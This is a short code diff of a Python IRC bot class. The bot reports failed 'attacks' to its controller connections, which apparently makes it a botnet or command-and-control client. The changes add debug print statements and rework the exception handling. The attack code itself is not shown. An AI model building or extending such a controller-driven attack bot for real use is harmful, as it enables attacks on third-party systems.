@@ -55,6 +55,7 @@ class Bot:
 
     # Message Encoder
     def sendData(self, msg):
+        print(msg)
         self.IRCSOCKET.send(msg.encode())
 
     # Send to Controller 
@@ -123,13 +124,13 @@ class Bot:
             for x in self.acceptedCons:
                 self.privateMsg(x, msg)
         except Exception as e:
-            reason = "Unknown reason"
-            for x in self.acceptedCons:
-                print("IM SENDING")
-                self.privateMsg(x, "Attack failed - name - idk")
+            print("found exception" + str(e))
+            reason = "unknown reason"
             if isinstance(e, socket.gaierror):
+                print("isinstance")
                 reason = "no such hostname"
             msg = ("Attack failed - " + self.botNick + " - " + str(reason))
+            print(msg)
             self.failCount = self.failCount + 1
             for x in self.acceptedCons:
                 self.privateMsg(x, msg)
